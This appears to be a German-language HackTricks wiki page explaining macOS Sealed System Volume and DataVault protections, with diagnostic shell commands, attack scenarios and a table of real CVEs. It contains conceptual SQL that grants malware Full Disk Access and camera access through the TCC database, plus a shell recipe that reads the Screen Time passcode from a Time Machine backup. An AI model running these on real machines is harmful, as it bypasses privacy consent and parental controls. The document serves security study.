# macOS Sealed System Volume & DataVault

{{#include ../../../banners/hacktricks-training.md}}

## Sealed System Volume (SSV)

### Grundlegende Informationen

Seit **macOS Big Sur (11.0)** wird das Systemvolume mithilfe eines kryptografisch gesicherten **APFS-Snapshot-Hashbaums** versiegelt. Dies wird als **Sealed System Volume (SSV)** bezeichnet. Die Systempartition wird **schreibgeschützt** eingebunden. Jede Änderung hebt die Versiegelung auf, die beim Booten überprüft wird.<sup>[[11]](#references)</sup>

Das SSV bietet:
- **Manipulationserkennung** — jede Änderung an System-Binaries oder -Frameworks verändert die Merkle-Tree-Wurzel und macht die von Apple signierte Versiegelung ungültig
- **Authentifizierung beim Booten** — die Boot-Kette überprüft den ausgewählten System-Snapshot, bevor er zum Root-Dateisystem wird
- **Rootkit-Resistenz** — selbst root kann Dateien im authentifizierten System-Snapshot nicht dauerhaft ersetzen, ohne authenticated root zu deaktivieren oder einen autorisierten Update-Pfad zu kompromittieren

Das SSV schützt das Volume **System**, nicht das damit gekoppelte, beschreibbare Volume **Data**. Firmlinks führen beide Volumes im unter `/` sichtbaren Namespace zusammen. Ein scheinbar beschreibbarer Pfad beweist daher nicht, dass das zugrunde liegende Objekt zum versiegelten Snapshot gehört. FileVault und Data Protection schützen die Vertraulichkeit ruhender Daten; sie sind von der SSV-Integrität getrennt.<sup>[[11]](#references)</sup>

### SSV-Status überprüfen

```bash
# Check if authenticated root is enabled (SSV seal verification)
csrutil authenticated-root status

# List APFS snapshots (the sealed snapshot is the boot volume)
diskutil apfs listSnapshots disk3s1

# Check mount status (should show read-only)
mount | grep " / " 

# Show the volume group and the current Sealed field
diskutil apfs listVolumeGroups
diskutil apfs list | grep -B 8 -A 8 'Sealed:'
```

### Effektive Systemansicht: SSV + Cryptex-Grafts

Bei aktuellen macOS-Versionen stammt nicht jede unterhalb von `/System` sichtbare ausführbare Datei zwingend aus dem gestarteten SSV-Snapshot. **Cryptexes** sind separat authentifizierte APFS-Disk-Images, deren Inhalte in ausgewählte Verzeichnisse eingehängt werden. Rapid Security Responses können daher sicherheitskritische Komponenten ersetzen, ohne den Basis-SSV neu zu erstellen. Wenn du Persistenz untersuchst oder Systemcode vergleichst, erfasse die aktiven Mounts und den Preboot-Cryptex-Speicher, statt nur den Basis-Snapshot zu hashen:

```bash
mount | grep -Ei 'cryptex|graft'
find /System/Volumes/Preboot/Cryptexes -maxdepth 4 -type d 2>/dev/null
```

Die Details zur Boot-Kette und zu Rapid Security Response werden unter [macOS Architecture — Cryptexes](../mac-os-architecture/README.md#cryptexes-and-rapid-security-responses) behandelt; dieser Abschnitt konzentriert sich auf die SSV-Grenze selbst.

### SSV-Schreiber-Berechtigungen

Bestimmte Apple-System-Binaries verfügen über Berechtigungen, mit denen sie das versiegelte Systemvolume ändern oder verwalten können:

| Berechtigung | Zweck |
|---|---|
| `com.apple.private.apfs.revert-to-snapshot` | Das Systemvolume auf einen vorherigen Snapshot zurücksetzen |
| `com.apple.private.apfs.create-sealed-snapshot` | Nach Systemupdates einen neuen versiegelten Snapshot erstellen |
| `com.apple.rootless.install.heritable` | In SIP-geschützte Pfade schreiben (wird von Kindprozessen übernommen) |
| `com.apple.rootless.install` | In SIP-geschützte Pfade schreiben |

### SSV-Schreiber finden

```bash
# Search for binaries with SSV-related entitlements
find /System /usr -type f -perm +111 -exec sh -c '
  ents=$(codesign -d --entitlements - "{}" 2>&1)
  echo "$ents" | grep -q "apfs.revert-to-snapshot\|apfs.create-sealed-snapshot\|rootless.install" && echo "{}"
' \; 2>/dev/null

# Using the scanner database
sqlite3 /tmp/executables.db "
SELECT e.path, c.name
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'ssv_writer';"
```

### Angriffsszenarien

#### Snapshot Rollback Attack

Wenn ein Angreifer eine Binärdatei mit `com.apple.private.apfs.revert-to-snapshot` kompromittiert, kann er **das Systemvolume auf einen Zustand vor einem Update zurücksetzen** und so bekannte Schwachstellen wiederherstellen:

```bash
# Conceptual — the snapshot revert operation would:
# 1. List available snapshots
diskutil apfs listSnapshots disk3s1

# 2. Revert to an older snapshot (requires the entitlement)
# This restores the system to a state with known, patched vulnerabilities
```

> [!WARNING]
> Ein Snapshot-Rollback **macht Sicherheitsupdates effektiv rückgängig** und stellt zuvor gepatchte Kernel- und System-Schwachstellen wieder her. Dies ist eine der gefährlichsten möglichen Operationen auf modernen macOS-Systemen.

#### Ersetzen von System-Binärdateien

Mit einem SIP-Bypass und Schreibzugriff auf das SSV kann ein Angreifer:

1. Das System-Volume mit Lese- und Schreibzugriff mounten
2. Einen System-Daemon oder eine Framework-Bibliothek durch eine trojanisierte Version ersetzen
3. Den Snapshot erneut versiegeln (oder das beschädigte Siegel akzeptieren, wenn SIP bereits beeinträchtigt ist)
4. Das Rootkit übersteht Neustarts und ist für Userland-Erkennungstools unsichtbar

### CVEs aus der Praxis

| CVE | Beschreibung |
|---|---|
| CVE-2021-30892 | **Shrootless** — SIP-Bypass, der `system_installd`'s `com.apple.rootless.install.heritable`-Entitlement missbraucht, um beliebige Post-Install-Skripte auszuführen ([Microsoft](https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/))<sup>[[1]](#references)</sup> |
| CVE-2022-22583 | SIP-Bypass: `system_installd` legte das Post-Install-Skript in einem SIP-geschützten Ordner unter `/tmp` ab. `/tmp` selbst ist jedoch nicht SIP-geschützt, sodass der Ordner durch das Mounten eines Images darüber ausgetauscht werden konnte ([Trend Micro](https://www.trendmicro.com/en_us/research/22/l/a-technical-analysis-of-cve-2022-22583-and-cve-2022-32800.html))<sup>[[2]](#references)</sup> |
| CVE-2022-46689 | **MacDirtyCow** — Copy-on-Write-Race in XNU, die Schreibzugriffe auf schreibgeschützte, root-eigene Dateien ermöglicht ([Worth Doing Badly](https://worthdoingbadly.com/macdirtycow/))<sup>[[3]](#references)</sup> |

---

## DataVault

### Grundlegende Informationen

**DataVault** ist ein entitlement-gesteuerter Dateisystemschutz für sensible Dateien und Verzeichnisse. Das BSD-Flag `UF_DATAVAULT` (`0x00000080`) kennzeichnet ein Objekt als zugriffsgeschützt, sodass zum Lesen und Schreiben ein Entitlement erforderlich ist. Anders als bei normaler DAC genügt es nicht, lediglich **root** zu werden oder Full Disk Access zu erhalten, solange der Schutz durchgesetzt wird.<sup>[[4]](#references)[[13]](#references)</sup>

Verwende „DataVault“ nicht als Synonym für jede geschützte Datenbank. Die TCC-Datenbanken unterliegen TCC/FDA- und SIP-spezifischen Richtlinien (siehe [macOS TCC](macos-tcc/README.md)), während der Zugriff auf Keychain-Einträge auch von Keychain-ACLs und kryptografischem Schutz abhängt (siehe [macOS Keychain](../../macos-red-teaming/macos-keychain.md)). Tatsächliche DataVault-Beispiele finden sich häufig in dienst-eigenen Speichern unter `/private/var/folders/.../0/`, etwa im Screen-Time-Speicher. Das Flag wird in den BSD-Dateiflags als `datavault` angezeigt, wenn sich das übergeordnete Verzeichnis mit `stat` abfragen lässt.

### DataVault-Controller-Entitlements

| Entitlement | Grenze |
|---|---|
| `com.apple.rootless.datavault.controller` | Zugriff auf `UF_DATAVAULT`-Objekte und deren Verwaltung<sup>[[13]](#references)</sup> |
| `com.apple.private.tcc.manager` | TCC-Entscheidungen verwalten; dies ist eine verwandte, aber separate Datenschutzgrenze |
| `com.apple.private.tcc.allow` | Ausgewählte, im Entitlement-Wert genannte TCC-Dienste umgehen |
| `com.apple.rootless.storage.TCC` | In den SIP-geschützten TCC-Speicher schreiben |

Ein Prozess, der ein DataVault-Controller-Entitlement mit FDA-, Backup-, Indexierungs- oder IPC-Funktionen kombiniert, ist besonders interessant: Suche nach einer Confused-Deputy-Primitive, die ein geschütztes Objekt in einen gewöhnlichen Pfad kopiert, statt zu versuchen, den Vault direkt zu öffnen.<sup>[[14]](#references)</sup>

### DataVault-Controller finden

```bash
# BSD flags: a protected object is printed with the `datavault` keyword
ls -ldeO@ /private/var/folders/*/*/0/com.apple.ScreenTimeAgent 2>/dev/null
sudo find /private/var/folders -flags +datavault -print 2>/dev/null

# Find Apple binaries carrying DataVault/TCC controller entitlements
find /System /usr -type f -perm +111 -exec sh -c '
  ents=$(codesign -d --entitlements - "{}" 2>&1)
  echo "$ents" | grep -q "datavault.controller\|private.tcc\|rootless.storage.TCC" && echo "{}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, c.name
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'datavault_controller';"
```

### Angriffsszenarien

#### Direkte Änderung der TCC-Datenbank (separate TCC-Grenze)

Wenn ein Angreifer einen TCC-Managerprozess kompromittiert (z. B. durch code injection in einen Prozess mit `com.apple.private.tcc.manager`), kann er **die TCC-Datenbank direkt ändern**, um jeder Anwendung beliebige TCC-Berechtigungen zu erteilen:<sup>[[12]](#references)</sup>

```sql
-- Grant Full Disk Access to a malicious binary (conceptual)
INSERT INTO access (service, client, client_type, auth_value, auth_reason, auth_version)
VALUES ('kTCCServiceSystemPolicyAllFiles', 'com.attacker.malware', 0, 2, 4, 1);

-- Grant camera access without a prompt
INSERT INTO access (service, client, client_type, auth_value, auth_reason, auth_version)
VALUES ('kTCCServiceCamera', 'com.attacker.malware', 0, 2, 4, 1);
```

> [!CAUTION]
> Änderungen an der TCC-Datenbank sind der **ultimative Privacy-Bypass** — sie gewähren stillschweigend jede Berechtigung, ohne Benutzerabfrage oder sichtbaren Hinweis. In der Vergangenheit endeten mehrere macOS-Privilege-Escalation-Ketten mit Schreibzugriffen auf die TCC-Datenbank als abschließendem Payload.

#### Zugriff auf die Keychain-Datenbank

Der direkte Zugriff auf eine Keychain-Datenbank ist nicht gleichbedeutend mit dem Zugriff auf Geheimnisse im Klartext. Selbst wenn eine andere Privilegiengrenze es einem Angreifer ermöglicht, die Datenbank zu kopieren, müssen weiterhin das Schlüsselmaterial und die ACLs der Einträge angegriffen werden. Siehe stattdessen die spezielle Seite zu [macOS Keychain](../../macos-red-teaming/macos-keychain.md), anstatt davon auszugehen, dass eine DataVault-Controller-Berechtigung ausreicht.

#### Grenze von Sicherungskopien: Time Machine

Eine Analyse aus dem Jahr 2026 zeigte ein nützliches allgemeines Muster: `backupd` verfügt sowohl über `com.apple.rootless.datavault.controller` als auch über Full Disk Access, damit es geschützte Datenspeicher kopieren kann. Bei der getesteten Konfiguration war `/private/var/folders` in Time Machine enthalten, und für die eingebundene Sicherungskopie galt die aktive DataVault-Grenze nicht. Der Forscher nutzte dies, um den SQLite-Datenspeicher von Screen Time zu finden und dessen PIN für Einschränkungen im Klartext auszulesen, ohne den aktiven Vault zu öffnen. Betrachte dies als **Angriff an der Kopiergrenze**: Ermittle Sicherungs-, Export-, Migrations-, Indexierungs- und Diagnose-Prozesse, die Vault-Daten auf einem weniger geschützten Mount oder Pfad bereitstellen können.<sup>[[13]](#references)[[14]](#references)</sup>

```bash
# Confirm the deputy's privileges and whether the source tree is included
codesign -d --entitlements - /System/Library/CoreServices/TimeMachine/backupd 2>&1
tmutil isexcluded /private/var/folders

# Inspect the newest mounted backup; paths vary per host
backup="$(tmutil latestbackup)"
db="$(find "$backup/Data/private/var/folders" -path '*/com.apple.ScreenTimeAgent/Store/RMAdminStore-Local.sqlite' -print -quit 2>/dev/null)"
sqlite3 "$db" 'SELECT ZPASSCODE1 FROM ZCOREORGANIZATIONSETTINGS WHERE ZPASSCODE1 IS NOT NULL LIMIT 1;'
```

Dieses Verhalten hängt von der Version und dem Backup-Layout ab. Überprüfe es auf dem Ziel-Build. Beachte außerdem: Ein verschlüsseltes Time-Machine-Ziel schützt die Kopie nur, solange es gesperrt ist; sobald es eingebunden ist, gehören seine Zugriffskontrollen zur Angriffsfläche.

### CVEs aus der Praxis im Zusammenhang mit DataVault/TCC-Umgehungen

| CVE | Beschreibung |
|---|---|
| CVE-2024-44131 | Symlink-Race in FileProvider, durch die ein privilegierter Helper auf TCC-geschützte Daten zugreifen konnte ([Jamf](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/))<sup>[[5]](#references)</sup> |
| CVE-2023-40424 | Als Root **einen neuen Benutzer anlegen, dessen `NFSHomeDirectory` auf eine vom Angreifer kontrollierte `TCC.db` verweist**; bei der Anmeldung liest `tccd` diese ein und übernimmt die Berechtigungen, wodurch Daten anderer Benutzer erreichbar werden ([Kandji](https://blog.kandji.io/malware-bypass-tcc))<sup>[[6]](#references)</sup> |
| CVE-2021-30970 | „powerdir“: das Home-Verzeichnis des Benutzers ändern, um eine vom Angreifer kontrollierte TCC.db zu platzieren ([Microsoft](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/))<sup>[[7]](#references)</sup> |
| CVE-2021-30713 | Fehler bei der Bundle-Zuordnung, durch den eine App **die TCC-Berechtigungen eines Spender-Bundles übernehmen** konnte, ohne dass eine Abfrage erschien; wurde in freier Wildbahn von **XCSSET** ausgenutzt, um Screenshots des Desktops anzufertigen ([Jamf](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/))<sup>[[8]](#references)</sup> |
| CVE-2020-9934 | `tccd` erstellte den DB-Pfad anhand von `$HOME`, sodass `launchctl setenv HOME` ihn auf eine vom Angreifer kontrollierte `TCC.db` umleiten konnte ([Matt Shockley](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8))<sup>[[9]](#references)</sup> |
| CVE-2020-29621 | `coreaudiod` verfügte über `com.apple.private.tcc.manager` **und** hatte die Library Validation deaktiviert. Daher konnte ein in `/Library/Audio/Plug-Ins/HAL` abgelegtes HAL-Plug-in beliebige TCC-Berechtigungen gewähren ([Wojciech Reguła](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/))<sup>[[10]](#references)</sup> |



## References

- [1] [Microsoft entdeckt neue macOS-Schwachstelle „Shrootless“, die System Integrity Protection umgehen könnte](https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/)
- [2] [Technische Analyse: CVE-2022-22583 – Trend Micro](https://www.trendmicro.com/en_us/research/22/l/a-technical-analysis-of-cve-2022-22583-and-cve-2022-32800.html)
- [3] [MacDirtyCow – Es schlecht machen](https://worthdoingbadly.com/macdirtycow/)
- [4] [Apple Platform Security — Datenschutz](https://support.apple.com/guide/security/data-protection-overview-sece3bee0835/web)
- [5] [Jamf Threat Labs – CVE-2024-44131: TCC-Umgehung stiehlt Daten aus iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [Kandji – macOS-Malware aufdecken: TCC umgehen](https://blog.kandji.io/malware-bypass-tcc)
- [7] [Neue macOS-Schwachstelle „powerdir“ könnte unbefugten Zugriff auf Benutzerdaten ermöglichen](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [8] [Zero-Day-TCC-Umgehung in XCSSET-Malware entdeckt](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [9] [CVE-2020–9934: Das macOS-Framework Transparency, Consent, and Control (TCC) umgehen](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [10] [Musik abspielen und TCC umgehen, auch bekannt als CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [11] [Der Albtraum der Apple-OTA-Updates (APFS-Snapshots)](https://jhftss.github.io/The-Nightmare-of-Apple-OTA-Update/)
- [12] [Objective-See — TCC-Exploitation](https://objective-see.org/blog/blog_0x4C.html)
- [13] [XNU `stat.h` — `UF_DATAVAULT`](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/stat.h)
- [14] [So umgehst du deinen eigenen Bildschirmzeit-Code – Quellcode und Analyse von Time Machine/DataVault](https://tangled.org/dunkirk.sh/zera/commit/e6b6236c395e5c9ec1a27ad2a76217d8cc2b4312)
{{#include ../../../banners/hacktricks-training.md}}
